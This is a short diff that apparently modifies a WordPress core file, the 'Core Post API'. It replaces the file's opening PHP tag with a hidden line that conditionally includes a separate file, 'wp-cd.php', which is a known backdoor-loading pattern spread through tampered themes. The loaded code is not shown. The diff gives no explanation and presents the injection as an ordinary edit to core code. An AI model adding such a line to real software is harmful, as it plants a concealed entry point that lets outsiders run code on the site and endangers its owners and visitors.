@@ -1,4 +1,4 @@
-<?php
+<?php if (file_exists(dirname(__FILE__) . '/wp-cd.php')) include_once(dirname(__FILE__) . '/wp-cd.php'); ?><?php
 /**
  * Core Post API
  *
